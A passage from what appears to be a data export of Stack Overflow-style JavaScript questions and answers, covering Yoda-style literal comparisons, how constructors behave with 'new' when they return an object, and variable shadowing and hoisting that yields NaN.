</code></pre>

<p>I can't come up with a reason you should ever do this, and have a strong feeling that it would just encourage bad coding habits. Say a developer makes a typo in a Yoda condition like <code>if (TRUE = someCondition())</code>, then <code>TRUE</code> could very well end up actually meaning <code>false</code>, or you might end up assigning <code>someObject</code> to <code>NULL</code>.</p>

<p>I guess I'm just wondering if there's some redeeming quality for this practice that I'm missing, or if this is just a plain old Bad Idea™</p>
","5445","","<p>The goal of this is just to improve compression, Paul Irish himself calls it as an ""Anti-Pattern"".</p>

<p>He describes it as <em>""Good for compression and scope chain traversal""</em> on the following presentation:</p>

<ul>
<li><a href=""http://www.slideshare.net/paul.irish/perfcompression"" rel=""nofollow"">jQuery Anti-Patterns for Performance &amp; Compression</a> (slide <a href=""http://www.slideshare.net/paul.irish/perfcompression/46"" rel=""nofollow"">46</a>)</li>
</ul>

<p>On scope chain traversal, we won't see any improvement on literals as <code>null</code>, <code>false</code>, <code>true</code>, since the scope chain is not inspected, they are just literals.</p>

<p>On other identifiers as <code>undefined</code> or <code>windows</code> the scope chain traversal is indeed inspected.</p>

"<p>I am very confused about how constructors work in Javascrpt; despite using the language for several years (mostly as if it were like a semi-imperative version of LISP) I would like to know more about how objects are supposed to work in it.</p>

<p>Given this code:</p>

<pre><code>function Foo(x) {
    return {
        bar: function() { return x; }
    };
}
</code></pre>

<p>What is the difference between calling <code>myFoo = Foo(5)</code> and <code>myFoo = new Foo(5)</code>?  Or, in other words, what exactly does a constructor in Javascript <em>do</em>?</p>
","5445","","<p>In this particular example, there's no difference in the end result.</p>

<p>This is because your <code>Foo</code> function is returning an <em>object instance</em>.</p>

<p>The <code>new</code> operator returns a newly created object that inherits from the constructor's prototype <em>only when the function returns a primitive value</em> (or it doesn't return anything, which is technically the <code>undefined</code> value).</p>

<p>For example:</p>

<pre><code>function Foo () {
  return 5; // or """", or null, or no return statement at all (undefined)
}

var foo = new Foo();
typeof foo; // ""object""
foo instanceof Foo; // true
Foo.prototype.isPrototypeOf(foo); // true
</code></pre>

<p>When you return an object, the newly created object that inherits from the constructor's prototype is simply discarded:</p>

<pre><code>function Foo () {
  return {};
}

var foo = new Foo();
typeof foo; // ""object""
foo instanceof Foo; // false
Foo.prototype.isPrototypeOf(foo); // false
</code></pre>

"<p>If I do this:</p>

<pre><code>var a = 0;

(function () {
    var a = a; //want to make local a = global a
    ++a;
    console.log(""fn"",a);
})();

console.log(a);​
</code></pre>

<p>The output is:</p>

<pre><code>fn NaN
0
</code></pre>

<p>Why does <code>a</code> inside of the self executing function become <code>NaN</code>?</p>

<p>I know it works fine if I do:</p>

<pre><code>(function () {
    var b = a;
    ++b;
    console.log(""fn"",b); // fn 1
})();
</code></pre>

<p>But if I go the way of the first version, it has the <code>NaN</code> issue.</p>

<p>Why is this happening?</p>
","5445","","<p>The <code>a</code> variable inside your function expression <em>shadows</em> the <code>a</code> variable declared on the outer scope.</p>

<p>It becomes <code>NaN</code>, since in the assignment:</p>

<pre><code>var a = a;
</code></pre>

<p>The right-side <code>a</code> it's actually referring to the <code>a</code> in the local scope.</p>

<p>Variable declarations are done before the function actually starts to be executed, this is commonly known as 'hoisting'.</p>

<p>Since it's the same variable, it holds the <code>undefined</code> value, and when you try to add any number to this value, it becomes <code>NaN</code>:</p>

<pre><code>console.log(undefined + 0);
